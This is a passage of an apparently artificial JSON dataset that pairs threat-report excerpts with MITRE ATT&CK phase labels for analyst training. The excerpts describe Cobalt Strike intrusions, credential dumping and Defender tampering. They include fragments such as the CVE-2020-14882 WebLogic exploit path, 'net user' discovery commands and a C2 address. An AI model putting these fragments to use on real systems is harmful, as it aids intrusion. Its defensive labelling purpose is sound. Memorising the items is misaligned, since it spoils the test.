        "input": "Described attack activity: The following guidance can mitigate the techniques described in the threat activity: \nEnable multi-factor authentication to mitigate compromised credentials. For Office 365 users, see multi-factor authentication support. For Consumer and Personal email accounts, see how to use two-step verification.   \nUse passwordless solutions like Microsoft Authenticator to secure accounts.   \nReview and enforce recommended Exchange Online access policies. Block ActiveSync clients from bypassing Conditional Access policies.   \nBlock all incoming traffic from anonymizing services where possible.   \nTurn on the following attack surface reduction rule to block or audit activity associated with this threat: Block credential stealing from the Windows local security authority subsystem (lsass.exe) ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Lateral Movement chain #1 The attacker was able to successfully move from workstation #1 to workstation #2 via service execution.  The attacker tried to replicate this movement technique towards two servers but were stopped when their Cobalt Strike PowerShell payloads were nabbed by AV.\nLateral Movement chain #2 Another attempt was made to move from workstation #1 to one of the servers, but this attempt was also thwarted by AV.  Just like the previous attempt, a remote service was created, however, this time a DLL payload was used rather than a PowerShell payload.\nLateral Movement chain #3 Privileges were escalated to SYSTEM on Workstation #1 via the Cobalt Strike 'GetSystem' command which makes use of named pipes. A Cobalt Strike DLL was copied to a server and executed using WMI. This activity was observed on three servers, including the Domain Controller.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: No privilege escalation was observed, but note that the Java.exe process was running as ahighintegrity process from the start.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 10 for command and control (C2). ",
        "output": "command and control",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While the threat actors had spent significant time in the environment, there appeared to be some interest in certain documents. A concrete example is, directly after the threat actors accesses the file server with AnyDesk, they usenotepad++to open a file related to the insurance policy of this victim.\nOn the beachhead, workstation files were opened with their 'preferred' option: Word for .docx, Excel for .xlsx and Internet Explorer for .pdf.\nWhile it is not always easy to get a full list of files a threat actor had specifically accessed, this time it was logged well in process activity.\nOn other machines, there was apparent interest in certain files, mainly related to possible passwords, PII and other financial data.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 29155 cyber actors are known to use VPNs to anonymize their operational activity. These cyber actors commonly attempt to exploit weaknesses in internet-facing systems, like the CVEs listed above, to initially access networks. In one instance, Unit 29155 cyber actors exploited CVE-2021-33044 and CVE-2021- 33045 on Dahua IP cameras to bypass identity authentication. ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: By Asheer Malhotra \nTHURSDAY, FEBRUARY 20, 2020 11:06 \nCisco Talos has observed a malware campaign that utilizes malicious Microsoft Office documents (maldocs) to spread a remote access trojan (RAT) we're calling \"ObliqueRAT.\" These maldocs use malicious macros to deliver the second stage RAT payload. This campaign appears to target organizations in Southeast Asia. Network based detection, although important, should be combined with endpoint protections to combat this threat and provide multiple layers of security. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant is currently tracking 12 malware families associated with the exploitation of Pulse Secure VPN devices. These families are related to the circumvention of authentication and backdoor access to these devices, but they are not necessarily related to each other and have been observed in separate investigations. It is likely that multiple actors are responsible for the creation and deployment of these various code families. \nThe focus of this report is on the activities of UNC2630 against U.S. Defense Industrial base (DIB) networks, but detailed malware analysis and detection methods for all samples observed at U.S. and European victim organizations are provided in the technical annex to assist network defenders in identifying a large range of malicious activity on affected appliances. Analysis is ongoing to determine the extent of the activity. \nMandiant continues to collaborate with the Ivanti and Pulse Secure teams, Microsoft Threat Intelligence Center (MSTIC), and relevant government and law enforcement agencies to investigate the threat, as well as develop recommendations and mitigations for affected Pulse Secure VPN appliance owners. \nAs part of their investigation, Ivanti has released mitigations for a vulnerability exploited in relation to this campaign as well as the Pulse Connect Secure Integrity Tool to assist with determining if systems have been impacted. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors were observed accessing a file server, and browsing though files related to passwords. These would later be observed opened off network, more details in theexfiltration sectionon that activity.\nOn the second day of the intrusion, after moving laterally to a Domain Controller, LSASS was accessed from a Cobalt Strike process. The access granted value 0x1010 was observed. Asnoted in a previous report, this value matches knownmimikatz access patterns. This logged event suggests Cobalt Strike accessed LSASS to dump credentials from memory. This activity was observed again on various hosts on the fourth and sixth days of the intrusion.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the beachhead host, to avoid dropping files to disk, several registry keys were created to store the payloads under:\nEach key has an associated payload (stage 1 and 2). These keys stored the data for the Cobalt Strike beacon executed on the beachhead.\ngeRBAdXTDCkN\ncbkSBtbjQBNFy\nExecution of the payload to run the Cobalt Strike beacon can be observed by base64 encoded PowerShell commands\nDuring the intrusion we observed activity related to Windows Defender tampering. This command was executed remotely on the hosts using Cobalt Strike modules such as psexec_psh. Scheduled scanning tasks were deleted, and a service was created to disable real-time monitoring.\nScheduled task commands\nRestricted Admin Mode was enabled by modifying the DisableRestrictedAdmin key to 0\nEnabling Restricted Admin Mode allows the attacker to use collected hashes to login instead of a password. An explanation can be found here [https://github.com/GhostPack/RestrictedAdmin]. The same technique was observed bySVRand variousotherthreat actors.\nThe same technique was also observed in a previousGootloader caseas well as two other publiccases.\nThe second registry modification allowed RDP connections by changing the 'DenyTSConnections' setting.\nWindows Firewall\nOn the domain controller, 'Netsh' was used to enable the remote desktop firewall profile\nfollowed by the remote admin firewall profile\nProcess Injection\nWe observed process injection activity, with PowerShell and dllhost being utilized to load Cobalt Strike beacons into the memory on the beachhead host.\nThis can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.\nDuring the intrusion, we observed multiple named pipes utilized by the threat actor's Cobalt Strike injected beacons via PowerShell and dllhost:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors pivoted towards multiple hosts on the domain from the beachhead. The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat). Operators executed the batch script through a remotely created service on the target system.\nThe following shows one of the batch scripts used to run a Cobalt Strike payload.\nAn obfuscated PowerShell script named 'agent1.ps1' was dropped on a machine through a Cobalt Strike Beacon. The PowerShell script had instructions to deobfuscate shellcode and run it in memory as a thread in the same PowerShell process.\nThe shellcode itself also has a PE file embedded inside of itself. Once the shellcode is running this PE file will be loaded into memory and executed. You can see this from the memory dump MZ header denoting the PE binary loaded into the PowerShell process.\nThe PE file is of a small size and has the capability to beacon out at regular intervals to a command-and-control server on 64.235.39[.]32 to retrieve instructions.\nThe Visual C# Command Line Compiler was observed being invoked by the PowerShell script where the shellcode was executed. This is most likely instructions that the previously discussed PE file retrieved from the remote command and control server.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In several Raspberry Robin detections, we have seen msiexec.exe go on to install a malicious DLL file. At this time we are not certain what the DLL does.. We suspect it may establish persistence on the victim's system. In the detections we saw, the malicious files were created as C:\\Windows\\Installer\\MSI $^{\\ast\\ast\\ast\\ast\\ast}$ .tmp files. In one case, a file with the same hash was also created as C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku. \nExamples: \nC:\\Windows\\Installer\\MSI5C01.tmp C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku   \no Shared MD5 hash: 6f5ea8383bc3bd07668a7d24fe9b0828 VirusTotal example C:\\Windows\\Installer\\MSIE160.tmp   \no MD5 hash: e8f0d33109448f877a0e532b1a27131a VirusTotal example ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.\nNext, let us investigate the content of the PowerShell script (ldr.ps1)\nOn line one, we can see var $cc (can be pronounced as C2?) that indicates the server where it will get all the other components such as the payloadsys.exe.The next line sets up random characters to be appended to the payload executable.\nThis binary (renamed tosysvr013.exe) was then executed by the same script.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access via a phishing email that linked to a google docs page that enticed the user to download a report, which was  a Bazar Loader executable file insteadReport-Review20-10.exe.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Zerologon vulnerability CVE 2020-1472 was again exploited to obtain domain admin level privileges.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: OceanLotus has been an active threat actor group for a number of years and remains one of the most sophisticated threat actors in the APAC region. As we have seen with the new KerrDown downloader being used in their recent campaigns, the group continues to build and employ new tools and techniques in their overall operations and playbooks. It is therefore imperative to understand and keep a track of the group's ongoing operations and capability to better defend against such threats. Given the high number of samples observed, we were also able to discern possible working hour patterns which shows us that the group likely has formal working hours and operating out of a region which is like Vietnam or nearby countries. While most of the targeting observed is towards Vietnamese speaking victims, given the known broader geographic and industry wide target base of OceanLotus, the group may use similar tools and playbooks against other targets.\nPalo Alto Networks customers are already protected via:\nAll samples in this report have a malicious verdict in WildFire \nDomains have been classified as malicious \nAutoFocus tags are available for additional context:OceanLotusandKerrDown.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Two and a half days later, the attackers signed into one of the target devices they found during their initial discovery efforts using compromised credentials via interactive sign-in. They opted for a credential theft technique that didn't require dropping a file like Mimikatz that antivirus products might detect. Instead, they opened Taskmgr.exe, created a dump file of the LSASS.exe process, and saved the file to a ZIP archive. \nThe attackers continued their previous discovery efforts using a PowerShell script version of ADRecon (ADRecon.ps1), which is a tool designed to gather extensive information about an Active Directory (AD) environment. The attacker followed up this action with a net scanning tool that opened connections to devices in the organization on server message block (SMB) and remote desktop protocol (RDP). For discovered devices, the attackers attempted to navigate to various network shares and used the Remote Desktop client (mstsc.exe) to sign into these devices, once again using the compromised account credentials. \nThese behaviors continued for days, with the attackers signing into numerous devices throughout the organization, dumping credentials, and determining what devices they could access. ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After loading the Cobalt Strike DLL, there was an almost instant injection by the process into the Werfault process.\nWe also see the Cobalt Strike Beacon running in the dllhost.exe process, loading PowerShell to perform PowerSploit commands in the discovery section.\nAdditionally via the use of YARA inspection we found Cobalt Strike running or injected into processes across the environment.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The inauthentic news sites operated by GLASSBRIDGE illustrate how information operations actors have embraced methods beyond social media in an attempt to spread their narratives. We have observed similar behavior from Russian and \nIranian IO actors. By posing as independent, and often local news outlets, IO actors are able to tailor their content to specific regional audiences and present their narratives as seemingly legitimate news and editorial content. In fact, the content has been crafted or amplified by PR and newswire firms who conceal their role, or actively misrepresent their content as local and independent news coverage. In the case of GLASSBRIDGE, the consistency in content, behavioral similarities, connections across firms, and pro-PRC messaging suggests the private firms take direction from a shared customer who outsourced the creation of influence campaigns. Google is committed to information transparency, and we will continue tracking GLASSBRIDGE and blocking their inauthentic content on Google's platforms. We regularly disclose our latest enforcement actions in the TAG Bulletin. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The original delivery mechanism was not found, but likely to have been a malicious email based on previous known Trickbot campaigns.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Privilege escalation was completed on two systems via the named pipeGetSystemfeature within the Cobalt Strike tool. An example is shown below via Sysmon event ID 1  ProcessCreate Rule:",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The main backdoor is implemented as a dynamic link library (DLL) and exports a function with the name \"NSPStartup\". After dropping it, the installer registers the backdoor as a winsock2 namespace provider with the help of the WSCInstallNameSpace API function and runs it by calling the WSCEnableNSProvider. \nAs a result of this installation, during initialization of the \"svchost $-\\mathsf{k}$ netsvcs\" process upon system startup, the registered namespace provider will be loaded into the address space of the process and the function \"NSPStartup\" will be called. ",
        "output": "persistence",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Exposing as much of FinFisher's riddles as possible during this painstaking analysis has allowed us to ensure our customers are protected against this advanced piece of malware. \nWindows 10 S devices are naturally protected against FinFisher and other threats thanks to the strong code integrity policies that don't allow unknown unsigned binaries to run (thus stopping FinFisher's PE installer) or loaded (blocking FinFisher's DLL persistence). On Windows 10, similar code integrity policies can be configured using Windows Defender Application Control. \nOffice 365 Advanced Threat Protection secures mailboxes from email campaigns that use zero-day exploits to deliver threats like FinFisher. Office 365 ATP blocks unsafe attachments, malicious links, and linked-to files using time-of-click protection. Using intel from this research, we have made Office 365 ATP more resistant to FinFisher's anti-sandbox checks. \nGeneric detections, advanced behavioral analytics, and machine learning technologies in Windows Defender Advanced Threat Protection detect FinFisher's malicious behavior throughout the attack kill chain and alert SecOps personnel. Windows Defender ATP also integrates with the Windows protection stack so that protections from Windows Defender AV and Windows Defender Exploit Guard are \nFinFisher exposed: A researcher's tale of defeating traps, tricks, and complex virtual machines | Microsoft Security Blog reported in Windows Defender ATP portal, enabling SecOps personnel to centrally manage security, and as well as promptly investigate and respond to hostile activity in the network. \nWe hope that this writeup of our journey through all the multiple layers of protection, obfuscation, and anti-analysis techniques of FinFisher will be useful to other researchers studying this malware. We believe that an industry-wide collaboration and information-sharing is important in defending customers against this complex piece of malware. For further reading, we recommend these other great references: \nDevirtualizing FinSpy [PDF], Tora (2012)   \nFinfisher rootkit analysis, Artem Baranov (2017)   \nA Walk-Through Tutorial, with Code, on Statically Unpacking the FinSpy VM:   \nPart One, x86 Deobfuscation, Rolf Rolles (2018)   \nFinSpy VM Part 2: VM Analysis and Bytecode Disassembly, Rolf Rolles (2018)   \nESET's guide to deobfuscating and devirtualizing FinFisher [PDF], Filip Kafka   \n(2018) \nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free trial. \nAndrea Allievi, Office 365 ATP Research team with Elia Florio, Windows Defender ATP Research team \nSample analyzed: \nMD5: a7b990d5f57b244dd17e9a937a41e7f5   \nSHA-1: c217d48c4ac1555491348721cc7cfd1143fe0b16   \nSHA-256:   \nb035ca2d174e5e4fd2d66fd3c8ce4ae5c1e75cf3290af872d1adb2658852afb ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Before the threat actors performed any scanning activity, they first ran the commandGetCallerIdentity.GetCallerIdentityis the AWS version ofwhoami. It returns various information about the entity that performed the call such as the user ID, account andAmazon Resource Name(ARN) of the principal associated with the credentials used to sign the request, as shown in Figure 2. The user ID is a unique identifier of the entity that performed the call, the account is the unique 12-digit identifier of the AWS account the credentials belong to, and the ARN includes the account ID and human-readable name of the principal performing the call.\nOnce the threat actor knew a little more about the credentials they compromised, they began their scanning activities. They utilized the tools Pacu and Scout Suite to gain a better understanding of what resources existed within the AWS account. Pacu is an open-source AWS exploitation framework, and it is designed to be the Metasploit equivalent in the cloud. Scout Suite is a security auditing tool used for security posture assessments of cloud environments.\nIn some of the cases we responded to, we saw Pacu already existed on hosts from previous penetration tests. Scout Suite was not something we saw downloaded onto the compromised EC2 instances, but we knew it was used based on the user agents associated with the threat actor activity. Both of these tools provide a lot of information for threat actors to get a lay of the land for the AWS account they've compromised.\nIn the cases, these tools scanned a variety of traditional services such as the following:\nEC2 \nIAM \nRDS \nS3 \nSNS \nSES \nLambda\nThe threat actors also performed other discovery calls against services that would not necessarily be expected that provided helpful information to the attackers, such as theOrganizations serviceandCost and Usageservice.\nAWS Organizationsprovides companies with a centralized place to manage multiple AWS accounts and resources. When reviewing the threat actor activity in the CloudTrail logs, three Organizations API calls stood out. The first call wasListOrganizationalUnitsForParent, which lists out all theOrganizational Units(OUs).\nFrom there, the threat actors ranListAccountswhich returns all the account IDs associated with each of those OUs. The final call that provided the threat actor with the most useful information was theDescribeOrganizationAPI call. This event returns the master account ID as well as the master account email address associated with that account. With that information, the threat actors have enough to attempt to log in as the Root user for that account.\nThe final discovery call of interest involved the Cost and Usage service. The threat actors performed variousGetCostandUsagecalls (shown in Figure 3) and the response returned information about the general costs within the compromised account (shown in Figure 4).\nDefenders need to be aware that threat actors can determine how active an account is by understanding the cost within a cloud account. If the total cost in an account is large, it might be easier for them to spin up new resources undetected, because the cost might not stand out.\nOn the other hand, if there is very little spending in an account, a couple new resources could stand out a lot more. Account owners with less spending might also have tighter notifications around cost, which would potentially trigger alerts when the threat actors create new resources.\nBoth the Organizations and Cost and Usage API calls are great examples of how the attack surface is different in the cloud. By using these innocuous looking API calls, threat actors gained a ton of information about the account structure and usage without performing a lot of suspicious activity that might trigger an alert.",
        "output": "discovery",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the threat actors obtain access to the victim's environment, they can start inspecting the environment via the following commands:\nnet usernet user <username>net user <username> /DOMAIN",
        "output": "discovery",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During this intrusion, the threat actor was primarily concerned with evading detection by Microsoft Defender. This can be seen multiple times throughout the intrusion where the threat actor checked the historical alerts from Defender usingpowershellGet-MpThreatafter conducting credential harvesting or lateral movement actions.\nDuring the intrusion, we observed multiple attempts to add exclusions and ultimately trying to disable the local Defender using below commands. The threat actor made several typos during the command execution, indicating a hands-on approach rather than a scripted one.\nThe mpms executable from the above commands was a renamedProcDumpbinary. It was likely renamed in an attempt to avoid detection.\nAfter some activity, the threat actor entered the 'Scans' directory of Microsoft's Defender software, located under:\nIn addition to checking the Windows Defender historical scan files, the threat actor once again used theGet-MpThreatCmdlet to query the history of threats detected by Windows Defender.\nDuring the intrusion, the threat actor relied heavily on the toolkitImpacket(especiallyatexec.pyandwmiexec).To facilitate some of its capabilities, the host-based firewall was modified before the actual execution ofatexec.pyand wmiexec executions:\nMultiple times during the intrusion, the threat actor made use of cabinet files (.cab). These are archive files, which support lossless data compression. They are mainly used to distribute device drivers and system files. However, in this case, the actor used its functionality similarly to a traditional .zip archive and deployed its contents under theprogramdatadirectory.\nAfter decompression, we found aNetSupportexecutable disguised as a Windows component. The executable file was namedmswow86.exe. The threat actor created a scheduled task to run the binary on every logon.\nAll the chosen names appear to represent a 'legitimate' Windows component:\nThe name for the executable (mswow86.exe) \nThe storage location of this executable (%programdata%\\schache\\) \nThe scheduled task name (Wow64 Subsystem)",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique : OS Credential Dumping: LSASS Memory (T1003.001) \nATT&CK Technique : OS Credential Dumping: Security Account Manager (T1003.002) \nATT&CK Technique : OS Credential Dumping: NTDS (T1003.003) \nATT&CK Technique : Multi-Factor Authentication Request Generation (T1621) ",
        "output": "credential access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\nDuring the intrusions, we could see SQL Server event ID18456Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\nExample of the failed brute force attempts:\nFollowed by eventual successful logins.\nIt it likely that multiple successful logins were observed due to the automated access script that the threat actor was using.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Add persistence capabilities to a PowerShell script \nNew-UserPersistenceOption \nConfigure user-level persistence options for the Add-Persistence function. ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In these attacks, the attackers used several known methods to move laterally: \nThe attackers heavily abused WMI for executing tools on remote systems. \nThe attackers also used other techniques such as creating service or schedule task on remote systems. \nstart c:\\ProgramData\\Microsoft\\DRM\\Server\\1.bat\"&echo[S]&cd&echo[E] \nIn some cases, the attackers simply run commands on remote systems using PsExec. ",
        "output": "lateral movement",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882. This vulnerability was discovered back in October 2020, which effects Oracle's WebLogic product. [1] We previouslyreportedon an intrusion that also used this exploit and ended in a coin miner. This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication.\nJust by invoking URL path/console/images/%252E%252E%252Fconsole.portaland a little bit of tweaking of the packet sent to the server, the threat actor will be able to run their code on the server.\nIn this case, we can clearly see from network logs that the attacker was probing the portal page and followed that by sending the crafted URL request.\nThe detailed payload in the header can be observed below:\nInterestingly, we can see the threat actor chose theFileSystemXmlApplicationContextclass to carry out this attack, executing a file namedpoc.xml. This technique is listed in PoC developed by Jang. [2]\nBelow we can see the payload inside of the xml file hosted in the attacker server. The payload will execute the PowerShell command on the vulnerable system.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The intrusion in this case began with a link to a google domain, storage.googleapis.com. This delivery method has been observed in both thread hijacked email distribution, as well as contact form campaigns. We assess with medium-high confidence that the one observed in our intrusion was likely from a contact form campaign, as the initial access URL was spotted in the wild across various sites, impersonating various companies' legal teams, trying to entice the user to download and review the malicious files.\nAfter clicking the link, the users end up at what, at first glance, may appear to be a legitimate google download site.\nNext, a zip file is downloaded to the victim's system, which when unzipped reveals the ISO image fileStolenImages_Evidence.iso, once mountedlures the victim to open a shortcut mimicking a fake documents folder:\nThe LNK was pointing to the following command, which runs a malicious DLL when the user double clicks on the LNK file:\nBy extracting LNK metadata usingEric Zimmerman's LECmdtool, we noticed that the initial BumbleBee payload was generated by the same threat actors reportedin our previous BumbleBee report:\nThe tracker database block details containing threat actor's hostname, MAC Address, and other details are the exact same as seen our the last BumbleBee report. However, the payload was slightly modified (name and icon).",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1055.002: Portable Executable Injection T1134.001: Token Impersonation/Thef T1484.002: Domain Trust Modification T1547.009: Shortcut Modification T1574.008: Path Interception by Search Order Hijacking ",
        "output": "privilege escalation",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After installing the main backdoor and establishing initial C2 communication, the attackers use a range of different tools to extract sensitive data and control the victim's machine. These tools include a password harvesting trojan, a reverse-shell backdoor and customized implementations of OpenSSH, WMIC and SMB. Sometimes, they only drop a simple perl reverse shell and use various collection methods to retrieve credentials from a set of machines, escalate privileges, and fan out across a network from there. Besides these tools, there is also a number of small utility modules of different functionalities, from loaders and configuration tools, to file shredders and network proxies. \nIt's also worth noting that this threat actor heavily relies on already existing code, using publicly available open source applications, as well as Metasploit tools and leaked malware sources, to build its own toolset. Some of these tools are designed to work under Cygwin and come together with the Cygwin API DLL, which may suggest that the attackers feel more comfortable when working in a Linux-like environment. ",
        "output": "lateral movement",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The BumbleBee loader itself uses several defense evasion and anti-analysis techniques. As detailed in the Execution section, the use of WMI to spawn new processes is a known technique to evade any parent/child process heuristics or detections.\nAnti-Analysis\nOnce the malware is unpacked, it becomes quite apparent to what the malware author(s) were looking for\nKnown malware analysis process names running:\nKnown sandbox usernames (Sorry if your name is Peter Wilson, no malware for you \ud83d\ude1f):\nSpecific Virtualization Software files on disk and registry keys (Virtual Box, Qemu, Parallels), example:\nCreate Remote Thread The malware used the win32 function CreateRemoteThread in order to execute code in rundll32.exe.\nNamed Pipes  Two named pipes were created in order to establish inter-process communications (IPC) between rundll32.exe and wabmig.exe.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the course of the intrusion, we observed port discovery (port 445) activity from the beachhead. We attribute this to the invocation of the PowerShell command Invoke-SMBExec. This was likely executed as part of theInvoke-TheHashframework based on other PowerShell modules observed.\nLooking at the traffic from a network perspective we observed the activity making DCE\\RPC calls to the svcctl endpoint and the named pipe \\pipe\\ntsvcs using the OpenSCManagerW operation.\nThis appeared to be how they profiled the network layout and remote hosts.\nThe threat actor was observed runningwhoamifrom the Tor2Mine PowerShell process on the beachhead.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Based on threat intelligence sources and the file name, we are highly confident that the threat actors accessed the victim's infrastructure through a Nitrogen campaign, which delivered a ZIP file via malicious Google ads (i.e., malvertising).\nNitrogen is known for leveraging legitimate utilities like Advanced IP Scanner, Putty, etc. to conceal malware. The following graph shows the Nitrogen infection chain and how it executed Sliver.\nThe ZIP file named Version.zip contained mainly:\na legitimate Python executable named setup.exe which was run by the victim. \ntwo hidden Python DLLs.\nUpon execution of Setup.exe, the following actions were performed:\nThe hidden python311.dll was loaded (DLL sideloading) and the Nitrogen code was launched. \nA legitimate copy of Advanced IP Scanner was copied into the %Public%\\Downloads folder. \npython.exe, pycryptodome, and a Sliver beacon were placed into a folder named %AppData%\\Notepad. \nThe Sliver beacon was executed through a Python script named slv.py which decrypts an AES-encrypted DLL (data.aes) and loads it into memory. \nAdvanced IP Scanner was installed in the compromised system.\nA very similar campaign was reported by @dipotwb onTwitter. We also observed overlap with campaigns reported byEsentire.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
